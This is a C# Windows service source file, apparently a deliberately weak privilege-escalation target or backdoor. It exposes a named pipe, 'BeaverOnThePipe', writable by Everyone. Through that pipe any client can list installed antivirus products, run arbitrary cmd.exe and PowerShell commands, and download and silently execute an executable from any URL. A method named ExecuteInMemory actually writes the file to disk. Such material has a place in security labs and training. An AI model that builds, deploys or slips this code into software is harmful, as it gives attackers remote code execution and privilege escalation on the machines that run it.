using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Text;
using System.Management;
using System.Collections.Generic;
using System.Net;
using System.Threading.Tasks;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Collections;
using System.Linq;
using System.Threading;

namespace BeaverElevateService
{
    public class NamedPipeServer
    {
        public void Start()
        {
            StreamWriter sw = File.AppendText(@"C:\Windows\Temp\BeaverElevateSvc.txt");
            sw.AutoFlush = true;
            Console.SetError(sw);
            Console.SetOut(sw);
            while (true)
            {
                // Bad permissions
                PipeSecurity pipeSecurity = new PipeSecurity();
                pipeSecurity.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, System.Security.AccessControl.AccessControlType.Allow));

                using (NamedPipeServerStream pipeServer = new NamedPipeServerStream(
                "BeaverOnThePipe",
                PipeDirection.InOut,
                -1,
                PipeTransmissionMode.Message,
                PipeOptions.Asynchronous,
                0, // InBufferSize
                0, // OutBufferSize
                pipeSecurity))
                {
                    Console.Out.WriteLine("Waiting for a client connection...");
                    pipeServer.WaitForConnection();
                    Console.Out.WriteLine("Client connected.");

                    using (StreamReader reader = new StreamReader(pipeServer))
                    {
                        string request = reader.ReadLine();
                        Console.Out.WriteLine($"Received: {request}");
                        if (request == "enumAV")
                        {
                            try
                            {
                                List<string> avlist = new List<string>();
                                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_AntiVirusProduct");
                                foreach (ManagementObject obj in searcher.Get())
                                {
                                    string displayName = obj["displayName"]?.ToString() ?? "Unknown";
                                    string vendor = obj["vendor"]?.ToString() ?? "Unknown";
                                    avlist.Add($"{vendor} : {displayName}");
                                }
                                Console.Out.WriteLine(String.Join(",", avlist));
                            }
                            catch { }
                        }
                        else if (request.Contains("invoke"))
                        {
                            try
                            {
                                var args = request.Split(' ');
                                string url = args[1];
                                string cleanurl = url.Remove(url.Length - 2);
                                Task.Run(() => ExecuteInMemory(cleanurl));
                                //ExecuteInMemory(cleanurl);
                            }
                            catch {
                                Console.WriteLine("Error running ExecuteInMemory()");
                            }
                        }
                        else if (request.Contains("download"))
                        {
                            try
                            {
                                var args = request.Split(' ');
                                string url = args[1];
                                string cleanurl = url.Remove(url.Length - 2);
                                Task.Run(() => ExecuteOnDisk(cleanurl));
                                //ExecuteOnDisk(cleanurl);
                            }
                            catch {
                                Console.WriteLine("Error running ExecuteOnDisk()");
                            }
                        }
                        else if (request.Contains("cmd"))
                        {
                            try
                            {
                                string incmd = request.Replace("cmd ", "");
                                string args = incmd.Remove(incmd.Length - 2);

                                ProcessStartInfo startInfo = new ProcessStartInfo();
                                startInfo.FileName = "C:\\Windows\\System32\\cmd.exe";
                                startInfo.Arguments = args;
                                startInfo.UseShellExecute = false;
                                startInfo.RedirectStandardOutput = true;
                                startInfo.WindowStyle = ProcessWindowStyle.Hidden;

                                Thread thread = new Thread(() =>
                                {
                                    using (Process process = new Process())
                                    {
                                        process.StartInfo = startInfo;
                                        process.Start();
                                        process.WaitForExit();
                                        if (startInfo.RedirectStandardOutput)
                                        {
                                            // Read the output from the process and write it back up the namedpipe
                                            string output = process.StandardOutput.ReadToEnd();
                                            Console.Out.WriteLine(output);
                                        }
                                    }
                                });

                                thread.Start();
                            }
                            catch { }
                        }
                        else if (request.Contains("pwsh"))
                        {
                            try
                            {
                                string inscript = request.Replace("pwsh ", "");
                                string script = inscript.Remove(inscript.Length - 2);

                                Assembly assembly = Assembly.Load("System.Management.Automation");
                                Type powerShellType = assembly.GetType("System.Management.Automation.PowerShell");
                                object powerShellInstance = Activator.CreateInstance(powerShellType);
                                MethodInfo addScriptMethod = powerShellType.GetMethod("AddScript", new Type[] { typeof(string) });
                                addScriptMethod.Invoke(powerShellInstance, new object[] { script });
                                MethodInfo invokeMethod = powerShellType.GetMethod("Invoke");
                                object result = invokeMethod.Invoke(powerShellInstance, null);
                                foreach (var item in (IEnumerable)result)
                                {
                                    Console.Out.WriteLine(item);
                                }
                            }
                            catch { }
                        }
                        else { }
                    }
                }
            }
        }

        static void ExecuteOnDisk(string downloadLink)
        {
            try
            {
                string tempFilePath = Path.Combine(Path.GetTempPath(), "update.exe");
                WebClient webClient = new WebClient();
                Console.WriteLine($"Downloading {downloadLink} to {tempFilePath}...");
                byte[] fileBytes = webClient.DownloadData(downloadLink);
                File.WriteAllBytes(tempFilePath, fileBytes);
                Console.WriteLine("Executing the file...");

                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = tempFilePath;
                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardOutput = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                using (Process process = new Process())
                {
                    process.StartInfo = startInfo;
                    process.Start();
                    //process.WaitForExit();
                }

            }
            catch
            {
                Console.WriteLine("Failed to download and execute!");
            }
        }

        static void ExecuteInMemory(string downloadLink)
        {
            try
            {
                WebClient webClient = new WebClient();
                byte[] exeBytes = webClient.DownloadData(downloadLink);

                Console.WriteLine("Executing in-memory process...");
                IntPtr processHandle = ExecuteInMemory(exeBytes);

                Console.WriteLine("Waiting for process completion...");
                WaitForSingleObject(processHandle, 0xFFFFFFFF);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        static IntPtr ExecuteInMemory(byte[] exeBytes)
        {
            IntPtr processHandle = IntPtr.Zero;

            try
            {
                string tempFilePath = CreateTempFile(exeBytes);

                Console.WriteLine($"Starting process: {tempFilePath}");
                STARTUPINFO si = new STARTUPINFO();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                bool success = CreateProcess(
                    tempFilePath,
                    null,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    0,
                    IntPtr.Zero,
                    null,
                    ref si,
                    out pi
                );

                if (!success)
                {
                    throw new Exception("Error at creating Process. Error: " + Marshal.GetLastWin32Error());
                }

                processHandle = pi.hProcess;
                Console.WriteLine($"Process started with handle: {processHandle}");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            return processHandle;
        }

        static string CreateTempFile(byte[] data)
        {
            string tempFilePath = System.IO.Path.GetTempFileName();
            System.IO.File.WriteAllBytes(tempFilePath, data);
            return tempFilePath;
        }

        const uint INFINITE = 0xFFFFFFFF;

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
    }
}